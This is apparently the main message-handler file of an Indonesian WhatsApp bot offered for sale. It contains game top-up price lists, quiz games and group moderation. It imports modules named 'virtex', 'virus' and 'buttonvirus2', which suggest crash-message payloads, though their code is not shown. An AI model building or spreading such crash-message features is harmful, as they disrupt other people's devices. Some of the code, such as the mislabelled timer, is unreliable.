///di Jual nih bang sc keren anti Apikey harga murah Cuma 50k di tawar juga bisa tapi ngotak y bang 🥱
process.on('uncaughtException', console.error)
require('./src/config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const { buttonvirus2 } = require('./scrape/buttonvirus2')
const { ngazap } = require('./scrape/ngazap')
const { philips } = require('./scrape/philips')
const { virtex } = require('./scrape/virtex')
const { virus } = require('./scrape/virus')
const role= 'wariorrLV'
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const { ytPlay, ytMp3, ytMp4 } = require('./lib/yt')
const axios = require('axios')
const path = require('path')
const os = require('os')
const fetch = require('node-fetch')
const crypto = require('crypto')
const ms = require('parse-ms')
const toMs = require('ms')
const moment = require('moment-timezone')
const { jadibot, conns } = require('./jadibot')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const x = require('xfarr-api')
const mathjs = require('mathjs')
const maker = require('mumaker')
const ggs = require('google-it')
const thiccysapi = require('textmaker-thiccy')
const toHur = require('@develoka/angka-terbilang-js')
const { performance } = require('perf_hooks')
const dani = require('./lib/null.js')
const caliph = require('caliph-api')
const hx = require("hxz-api")
const bocil = require("@bochilteam/scraper")
const { Primbon } = require('scrape-primbon')
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const primbon = new Primbon()
const imgbbUploader = require('imgbb-uploader')
const Ceptiyt = ('*ɴᴏᴛᴇ  :*\n*• ʙᴏᴛ ᴍᴀsɪʜ ᴅᴀʟᴀᴍ ᴛᴀʜᴀᴘ ᴘᴇʀᴋᴇᴍʙᴀɴɢᴀɴ ᴊɪᴋᴀ ᴀᴅᴀ ʙᴜɢ sɪʟᴀʜᴋɴ ʟᴀᴘᴏʀ ᴋᴇ ᴏᴡɴᴇʀ.*')  //ubah di config biar ngk emror
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const  { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, generateProfilePicture, reSize}= require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,  Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { pinterest, wallpaper, wikimedia, quotesAnime, aiovideodl, umma, ringtone } = require('./lib/scraper.js')
const { hentai } = require('./lib/scraper2.js')
const { cmdadd } = require('./lib/hit')
const { cmdaddtd } = require('./lib/hittd')
const { mediafireDl } = require('./lib/mediafire.js')
const {  zippyDownloader } = require('./lib/downloader')
const { cerpen } = require('./storage/story/cerpen')
const { color, bgcolor } = require("./lib/color")
const { CeptiWiki } = require('./lib/Ceptiwiki.js')
const {
  adduang,
  adduangUser,
  checkuangUser,
  confirmuang
} = require('./lib/atm.js')
const tanggl = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
const timetime = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
// read database
let limit = JSON.parse(fs.readFileSync('./database/user/limit.json'));
let uang = JSON.parse(fs.readFileSync('./database/user/uang.json'));
let premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let banned = JSON.parse(fs.readFileSync('./database/user/banned.json'));
let register = JSON.parse(fs.readFileSync('./database/user/register.json'));
let setting = JSON.parse(fs.readFileSync('./src/setting.json'))
logonya = fs.readFileSync("./cepti/thumb.jpg")
global.db = JSON.parse(fs.readFileSync('./src/database.json'))
const ceemde = JSON.parse(fs.readFileSync('./database/totalcmd.json'))
const ceemdetd = JSON.parse(fs.readFileSync('./database/todaycmd.json'))
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let antilink = JSON.parse(fs.readFileSync("./database/group/antilink.json"));
if (global.db) global.db = {
    sticker: {},
    database: {},
    game: {},
    settings: {},
    others: {},
    users: {},
    ...(global.db || {})
}
let list = {
  "ff": {
    "FF5": {
    "nama": "5 Diamond",
    "hargaid": 900,
    "harga":"Rp900",
    },
        "FF10": {
    "nama": "10 Diamond",
    "hargaid": 1800,
    "harga":"Rp1.800",
    },
        "FF15": {
    "nama": "15 Diamond",
    "hargaid": 2700,
    "harga":"Rp2.700",
    },
        "FF20": {
    "nama": "20 Diamond",
    "hargaid": 3000,
    "harga":"Rp3.000",
    },
        "FF25": {
    "nama": "25 Diamond",
    "hargaid": 3900,
    "harga":"Rp3.900",
    },
        "FF30": {
    "nama": "30 Diamond",
    "hargaid": 4800,
    "harga":"Rp4.800",
    },
        "FF40": {
    "nama": "40 Diamond",
    "hargaid": 6000,
    "harga":"Rp6.000",
    },
        "FF50": {
    "nama": "50 Diamond",
    "hargaid": 7200,
    "harga":"Rp7.200",
    },
        "FF55": {
    "nama": "55 Diamond",
    "hargaid": 8100,
    "harga":"Rp8.100",
    },
        "FF60": {
    "nama": "60 Diamond",
    "hargaid": 9000,
    "harga":"Rp9.000",
    },
        "FF70": {
    "nama": "70 Diamond",
    "hargaid": 9900,
    "harga":"Rp9.900",
    },
        "FF75": {
    "nama": "75 Diamond",
    "hargaid": 10800,
    "harga":"Rp10.800",
    },
"FF80": {
"nama": "80 Diamond",	
"hargaid":11700,
"harga":"Rp11.700",
},
"FF90": {
"nama": "90 Diamond",	
"hargaid":12900,
"harga":"Rp12.900",
},
"FF95": {
"nama": "95 Diamond",	
"hargaid":13800,
"harga":"Rp13.800",	
},
"FF100": {
"nama": "100 Diamond",	
"hargaid": 14400,
"harga":"Rp14.400",
},
"FF120": {
"nama": "120 Diamond",	
"hargaid":17100,
"harga":"Rp17.100",
},
"FF130": {
"nama": "130 Diamond",	
"hargaid":18900,
"harga":"Rp18.900",
},
"FF140": {
"nama": "140 Diamond",	
"hargaid":19800,
"harga":"Rp19.800",	
},
"FF145": {
"nama": "145 Diamond",	
"hargaid":20700,
"harga":"Rp20.700",
},
"FF150": {
"nama": "150 Diamond",	
"hargaid":21600,
"harga":"Rp21.600",
},
"FF160": {
"nama": "160 Diamond",	
"hargaid":22800,
"harga":"Rp22.800",
},
"FF180": {
"nama": "180 Diamond",	
"hargaid":25800,
"harga":"Rp25.800",
},
"FF190": {
"nama": "190 Diamond",	
"hargaid":27000,
"harga":"Rp27.000",
},
"FF200": {
"nama": "200 Diamond",	
"hargaid":28800,
"harga":"Rp28.800",
},
"FF210": {
"nama": "210 Diamond",	
"hargaid":29700,
"harga":"Rp29.700",
},
"FFM": {
"nama": "Member Mingguan",
"hargaid":30000,
"harga":"Rp30.000",
},
"FF250": {
"nama": "250 Diamond",	
"hargaid":35700,
"harga":"Rp35.700",
},
"FF280": {
"nama": "280 Diamond",	
"hargaid":39600,
"harga":"Rp39.600",
},
"FF300": {
"nama": "300 Diamond",	
"hargaid":42600,
"harga":"Rp42.600",
},
"FF355": {
"nama": "355 Diamond",	
"hargaid":49900,
"harga":"Rp49.900",
},
"FF350": {
"nama": "350 Diamond",	
"hargaid":49500,
"harga":"Rp49.500",
},
"FF375": {
"nama": "375 Diamond",	
"hargaid":52500,
"harga":"Rp52.500",
},
"FF400": {
"nama": "400 Diamond",	
"hargaid":56400,
"harga":"Rp56.400",
},
"FF405": {
"nama": "405 Diamond",	
"hargaid":56700,
"harga":"Rp56.700",
},
"FF425": {
"nama": "425 Diamond",	
"hargaid":59400,
"harga":"Rp59.400",
},
"FF475": {
"nama": "475 Diamond",	
"hargaid":66600,
"harga":"Rp66.600",
},
"FF500": {
"nama": "500 Diamond",	
"hargaid":70200,
"harga":"Rp70.200",
},
"FF510": {
"nama": "510 Diamond",	
"hargaid": 72000,
"harga":"Rp72.000",
},
"FF515": {
"nama": "515 Diamond",	
"hargaid": 72300,
"harga":"Rp72.300",
},

"FF512": {
"nama": "512+3 Diamond",	
"hargaid":72300,
"harga":"Rp72.300",
},
"FF545": {
"nama": "545 Diamond",	
"hargaid":76500,
"harga":"Rp76.500",
},
"FF565": {
"nama": "565 Diamond",	
"hargaid":79200,
"harga":"Rp79.200",	
},
"FF600": {
"nama": "600 Diamond",	
"hargaid":84600,
"harga":"Rp84.600",
},
"FF635": {
"nama": "635 Diamond",	
"hargaid": 89100,
"harga":"Rp89.100",
},
"FF645": {
"nama": "645 Diamond",	
"hargaid":90900,
"harga":"Rp90.900",
},
"FF655": {
"nama": "655 Diamond",	
"hargaid":92100,
"harga":"Rp92.100",
},
"FF720": {
"nama": "720 Diamond",	
"hargaid": 99000,
"harga":"Rp99.000",
},
"FF700": {
"nama": "700 Diamond",	
"hargaid":99000,
"harga":"Rp99.000",
},
"FF770": {
"nama": "770 Diamond",	
"hargaid":106200,
"harga":"Rp106.200",	
},
"FF790": {
"nama": "790 Diamond",	
"hargaid": 108900,
"harga":"Rp108.900",
},
"FF800": {
"nama": "800 Diamond",	
"hargaid": 110700,
"harga":"Rp110.700",
},
"FF860": {
"nama": "860 Diamond",	
"hargaid": 118800,
"harga":"Rp118.800",
},
"FF930": {
"nama": "930 Diamond",	
"hargaid":128700,
"harga":"Rp128.700",
},
"FF1000": {
"nama": "1000 Diamond",	
"hargaid":138600,
"harga":"Rp138.600",	
},
"FF1050": {
"nama": "1050 Diamond",	
"hargaid":145800,
"harga":"Rp145.800",
},
"FF1075": {
"nama": "1075 Diamond",	
"hargaid":148500,
"harga":"Rp148.500",
},
"FF1080": {
"nama": "1080 Diamond",	
"hargaid":149400,
"harga":"Rp149.400",
},
"FFB": {
"nama": "Member Bulanan",
"hargaid":150000,
"harga":"Rp150.000",
},
"FF1200": {
"nama": "1200 Diamond",	
"hargaid":166800,
"harga":"Rp166.800",
},
"FF1215": {
"nama": "1215 Diamond",	
"hargaid":16830,
"harga":"Rp168.300",
},
"FF1300": {
"nama": "1300 Diamond",	
"hargaid":180900,
"harga":"Rp180.900",
},
"FF1440": {
"nama": "1440 Diamond",	
"hargaid":198000,
"harga":"Rp198.000",
},
"FF1450": {
"nama": "1450 Diamond",	
"hargaid":199800,
"harga":"Rp199.800",
},
"FF1490": {
"nama": "1490 Diamond",	
"hargaid":205200,
"harga":"Rp205.200",
},
"FF1510": {
"nama": "1510 Diamond",	
"hargaid":207900,
"harga":"Rp207.900",
},
"FF1580": {
"nama": "1580 Diamond",	
"hargaid":217800,
"harga":"Rp217.800",
},
"FF1795": {
"nama": "1795 Diamond",	
"hargaid":247500,
"harga":"Rp247.500",
},
"FF1800": {
"nama": "1800, Diamond",	
"hargaid": 248400,
"harga":"Rp248.400",
},
"FF2000": {
"nama": "2000 Diamond",	
"hargaid":270000,
"harga":"Rp270.000",
},
"FF2140": {
"nama": "2140 Diamond",	
"hargaid": 289800,
"harga":"Rp289.800",
},
"FF2190": {
"nama": "2190 Diamond",	
"hargaid": 297000,
"harga":"Rp297.000",
},
"FF2210": {
"nama": "2210 Diamond",	
"hargaid": 299700,
"harga":"Rp299.700",
},
"FF2280": {
"nama": "2280 Diamond",	
"hargaid": 309600,
"harga":"Rp309.600",
},
"FF2355": {
"nama": "2355 Diamond",	
"hargaid": 319500,
"harga":"Rp319.500",
},
"FF2720": {
"nama": "2720 Diamond",	
"hargaid": 369000,
"harga":"Rp369.000",
},
"FF4000": {
"nama": "4000 Diamond",	
"hargaid": 540000,
"harga":"Rp540.000",
},
"FF77290": {
"nama": "7290 Diamond",	
"hargaid": 990000,
"harga":"Rp990.000",
},
},
};
let listml = {
  "ml": {
    "UPMBL5": {
    "nama": "5 Diamond",
    "hargaid": 1700,
    "harga":"Rp1.700",
    },
        "UPMBL12": {
    "nama": "12 Diamond",
    "hargaid": 4000,
    "harga":"Rp4.000",
    },
    "ZIDMBL17": {
    "nama": "17 Diamond",
    "hargaid": 4500,
    "harga":"Rp4.500",
    },
        "UPMBL19": {
    "nama": "19 Diamond",
    "hargaid": 7000,
    "harga":"Rp7.000",
    },
        "UPMBL28": {
    "nama": "28 Diamond",
    "hargaid": 10500,
    "harga":"Rp10.500",
    },
        "UPMBL36": {
    "nama": "36 Diamond",
    "hargaid": 13000,
    "harga":"Rp13.000",
    },
        "UPMBL44": {
    "nama": "44 Diamond",
    "hargaid": 15000,
    "harga":"Rp15.000",
    },
        "UPMBL59": {
    "nama": "59 Diamond",
    "hargaid": 18500,
    "harga":"Rp18.500",
    },
        "UPMBL74": {
    "nama": "74 Diamond",
    "hargaid": 22500,
    "harga":"Rp22.500",
    },
        "UPMBL85": {
    "nama": "85 Diamond",
    "hargaid": 26500,
    "harga":"Rp26.500",
    },
        "UPMBL170": {
    "nama": "170 Diamond",
    "hargaid": 51500,
    "harga":"Rp51.500",
    },
        "UPMBL185": {
    "nama": "185 Diamond",
    "hargaid": 56500,
    "harga":"Rp56.500",
    },
        "UPMBL222": {
    "nama": "222 Diamond",
    "hargaid": 67500,
    "harga":"Rp67.500",
    },
        "UPMBL240": {
    "nama": "240 Diamond",
    "hargaid": 72500,
    "harga":"Rp72.500",
    },
        "UPMBL296": {
    "nama": "296 Diamond",
    "hargaid": 89500,
    "harga":"Rp89.500",
    },
        "UPMBL370": {
    "nama": "370 Diamond",
    "hargaid": 111500,
    "harga":"Rp111.500",
    },
        "UPMBL408": {
    "nama": "408 Diamond",
    "hargaid": 123500,
    "harga":"Rp123.500",
    },
        "UPMBL568": {
    "nama": "568 Diamond",
    "hargaid": 167500,
    "harga":"Rp167.500",
    },
        "UPMBL875": {
    "nama": "875 Diamond",
    "hargaid": 256500,
    "harga":"Rp256.500",
    },
        "UPMBL1159": {
    "nama": "1159 Diamond",
    "hargaid": 333500,
    "harga":"Rp333.500",
    },
        "UPMBL2010": {
    "nama": "2010 Diamond",
    "hargaid": 555.500,
    "harga":"Rp555.500",
    },
        "UPMBL4830": {
    "nama": "4830 Diamond",
    "hargaid": 1322500,
    "harga":"Rp1322.500",
    },
 },
};
let listmlbb = {
  "ml": {
    "ZIDMBL17": {
    "nama": "17 Diamond",
    "hargaid": 4500,
    "harga":"Rp4.500",
    },
        "ZIDMBL34": {
    "nama": "34 Diamond",
    "hargaid": 9000,
    "harga":"Rp9.000",
    },
    "ZIDMBL50": {
    "nama": "50 Diamond",
    "hargaid": 13500,
    "harga":"Rp13.500",
    },
        "ZIDMBL66": {
    "nama": "66 Diamond",
    "hargaid": 18000,
    "harga":"Rp18.000",
    },
        "ZIDMBL74": {
    "nama": "74 Diamond",
    "hargaid": 20000,
    "harga":"Rp20.000",
    },
        "ZIDMBL83": {
    "nama": "83 Diamond",
    "hargaid": 22500,
    "harga":"Rp22.500",
    },
        "ZIDMBL184": {
    "nama": "184 Diamond",
    "hargaid": 5000,
    "harga":"Rp50.000",
    },
        "ZIDMBL366": {
    "nama": "366 Diamond",
    "hargaid": 100000,
    "harga":"Rp100.000",
    },
        "ZIDMBL758": {
    "nama": "758 Diamond",
    "hargaid": 200000,
    "harga":"Rp200.000",
    },
 },
}

let tebaklagu = db.game.tebaklagu = []
let _family100 = db.game.family100 = []
let kuismath = db.game.math = []
let tebakgambar = db.game.tebakgambar = []
let tebakkata = db.game.tebakkata = []
let caklontong = db.game.lontong = []
let caklontong_desk = db.game.lontong_desk = []
let tebakkalimat = db.game.kalimat = []
let tebaklirik = db.game.lirik = []
let tebaktebakan = db.game.tebakan = []
let vote = db.others.vote = []
const limitawal = setting.limitawal
const uangawal = setting.uangawal
CeptiBotZ = fs.readFileSync('./cepti/Cepti.png')
// UCAPAN WAKTU By MyMans APIs)
const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(time2 < "23:59:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
}
if(time2 < "19:00:00"){
var ucapanWaktu = 'Selamat Petang 🌃'
 }
if(time2 < "18:00:00"){
var ucapanWaktu = 'Selamat Sore 🌆'
 }
if(time2 < "15:00:00"){
var ucapanWaktu = 'Selamat Siang 🏞️'
 }
if(time2 < "11:00:00"){
var ucapanWaktu = 'Selamat Pagi 🌅'
 }
if(time2 < "05:00:00"){
var ucapanWaktu = 'Selamat Malam 🌌'
 }
// TANGGAL By MyMans APIs 
var buln = ['/01/', '/02/', '/03/', '/04/', '/05/', '/06/', '/07/', '/08/', '/09/', '/10/', '/11/', '/12/'];
var myHari = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
var tgel = new Date();
var hri = tgel.getDate();
var bulnh = tgel.getMonth();
var thisHari = tgel.getDay(),
    thisDaye = myHari[thisHari];
var yye = tgel.getYear();
var syear = (yye < 1000) ? yye + 1900 : yye;
const jangwak = (hri + '' + buln[bulnh] + '' + syear)
const janghar = (thisDaye)
module.exports = Cepti = async (Cepti, m, chatUpdate, store) => {
    try {
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? setting.prefix
const isCmd = body.startsWith(prefix)
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await Cepti.decodeJid(Cepti.user.id)
const isOwner = setting.ownerNumber == m.sender ? true : ["088293100977@s.whatsapp.net"].includes(m.sender) ? true : false
const itsMe = m.sender == botNumber ? true : false
const text = args.join(' ')
const q = args.join(' ')
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
const from = m.chat
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
	const isPremium = premium.includes(m.sender)
	const isBan = banned.includes(m.sender)
	const isRegister = register.includes(m.sender)
// Group
const groupMetadata = m.isGroup ? await Cepti.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isWelkom = m.isGroup ? welkom.includes(from) : false
const isAntilink = m.isGroup ? antilink.includes(from) : false
const isMute = m.isGroup ? mute.includes(from) : false
if (isMute){
if (!groupAdmins && !isOwner)
return
}
// Public & Self
if (!Cepti.public) {
if (isOwner && !m.key.fromMe) return
}
function randomNomor(angka){
return Math.floor(Math.random() * angka) + 1
}
const hsjdh = randomNomor(5)
// Push Message To Console && Auto Read
if (m.message && !m.key.fromMe) {
Cepti.readMessages([m.key])
Cepti.sendPresenceUpdate('available', from)
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
adduangUser(sender, hsjdh)
}
const reactionMessage = {
    react: {
text: args[0],
key: { remoteJid: m.chat, fromMe: false, id: quoted.id }
    }
}
	//BUTON MESAGE
	const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const butonna = {
text: text1,
footer: desc1,
buttons: but,
headerType: 1
}
Cepti.sendMessage(id, butonna, options)
}
const http = randomNomor(500)
	///reply
const reply = (teks) => {
return Cepti.sendMessage(from, { text: teks, mentions: parseMention(teks) }, { quoted: m })
}
	const ftex = {
	 key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "120363037883546943@g.us" } : {}) 
},
	 message: { 
"extendedTextMessage": {
 "text": `Hallo ${pushname}`,
 "title": `Hallo ${pushname}`,
 'jpegThumbnail': fs.readFileSync("./cepti/webpmobile.jpg")
}
	  } 
}
	const kmd = (teks) => {
Cepti.sendMessage(from, { text : teks, contextInfo:{externalAdReply:{
title:"*CeptiBotZ",
body: "Free WhatsApp Bot", 
thumbnail: fs.readFileSync("./cepti/webpmobile.jpg"),
mediaType:1,
mediaUrl: 'https://www.instagram.com/cepti289',
sourceUrl: "https://www.instagram.com/cepti289"}}}, { quoted: m })
}
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
}
//SETINGAN
let karutaset = global.db.settings[botNumber]
if (typeof karutaset !== 'object') global.db.settings[botNumber] = {}
if (karutaset) {
if (!isNumber(karutaset.status)) karutaset.status = 0
if (!('autobio' in karutaset)) karutaset.autobio = false
if (!('templateImage' in karutaset)) karutaset.templateImage = false
if (!('templateVideo' in karutaset)) karutaset.templateVideo = false
if (!('templateGif' in karutaset)) karutaset.templateGif = false
if (!('templateMsg' in karutaset)) karutaset.templateMsg = false
if (!('templateDocument' in karutaset)) karutaset.templateDocument = true
} else global.db.settings[botNumber] = {
status: 0,
autobio: false,
templateImage: false,
templateVideo: false,
templateGif: false,
templateMsg: false,
templateDocument: true,
}
} catch (err) {
console.error(err)
}
// AFK
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`*「 AFK MODE 」*\n
*Sssttt! Orangnya lagi AFK, jangan di reply/tag*
➸ ${reason ? 'Alasan :' + reason : 'Alasan : Nothing'}
➸ *Selama* : ${clockString(new Date - afkTime)}`
.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
reply(`@${sender.split("@")[0]} Telah kembali
Selama : ${clockString(new Date - user.afkTime)}
Setelah : ${user.afkReason}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
if (isCmd) cmdadd()
const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
if (isCmd) cmdaddtd()
const totalhittd = JSON.parse(fs.readFileSync('./database/todaycmd.json'))[0].todaycmd
// AntiLink Ajg
if (isAntilink) {
if (!isBotAdmins) return
}
if (budy.includes(`https://chat.whatsapp.com/`)) {
bvl = `*GROUP LINK DETECTOR*\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isOwner) return reply(bvl)
kice = m.sender
Cepti.sendMessage(from, {text:`*GROUP LINK DETECTOR*\n\n@${kice.split("@")[0]} Akan dikick karena mengirim link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
setTimeout( () => {
  Cepti.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}, 3000)
} else {
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
	// write database every 5 minute
	setInterval(() => {
fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
}, 5 * 1000)
  // reset every 12 hours
let cron = require('node-cron')
cron.schedule('00 00 * * *', () => {
var resetyah = [{"todaycmd":0}]
claimnya = resetyah
console.log('time to reset')
fs.writeFileSync('./database/todaycmd.json', JSON.stringify(claimnya))
exec(`pm2 restart index`)
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})
const point = Math.floor(Math.random() * 1) + 0
  /////////FUNTION LIMIT
const addlimit = (sender) => {
	const obj = {id: sender, limit : 0}
limit.push(obj)
fs.writeFileSync('./database/user/limit.json', JSON.stringify(limit))
}
const addlimitUser = (sender, amount) => {
	let position = false
Object.keys(limit).forEach((i) => {
if (limit[i].id === sender) {
    position = i
}
})
if (position !== false) {
limit[position].limit += amount
fs.writeFileSync('./database/user/limit.json', JSON.stringify(limit))
}
}

const checklimitUser = (sender) => {
	let position = false
Object.keys(limit).forEach((i) => {
if (limit[i].id === sender) {
    position = i
}
})
if (position !== false) {
return limit[position].limit
}
}
 
 const confirmlimit = (sender, amount) => {
   if (isPremium) {return false;}
 let position = false
Object.keys(limit).forEach((i) => {
if (limit[i].id == sender) {
    position = i
}
})
if (position !== false) {
limit[position].limit -= amount
fs.writeFileSync('./database/user/limit.json', JSON.stringify(limit))
}
}
//Checklimit
if (isRegister ) {
const checklimit = checklimitUser(sender)
try {
if (checklimit === undefined) addlimit(sender)
addlimitUser(sender, point)
} catch (err) {
console.error(err)
}
}
//Checkuang
if (isRegister ) {
const checkuang = checkuangUser(sender)
try {
if (checkuang === undefined) adduang(sender)
adduangUser(sender, point)
} catch (err) {
console.error(err)
}
}
// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.sticker)) {
let hash = global.db.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
userJid: Cepti.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, Cepti.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
Cepti.ev.emit('messages.upsert', msg)
}

	if (('family100'+m.chat in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+m.chat]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
if (room.terjawab[index]) return !0
room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
    }).filter(v => v).join('\n')}
    ${isSurender ? '' : `Perfect Player`}`.trim()
Cepti.sendText(m.chat, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+m.chat].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+m.chat]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   adduangUser(sender, http, uang)
await Cepti.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? tekan button dibawah`, ` © ${setting.botName} bot`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
  adduangUser(sender, http, uang)
await reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\nHadiah : $${http}\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
adduangUser(sender, http, uang)
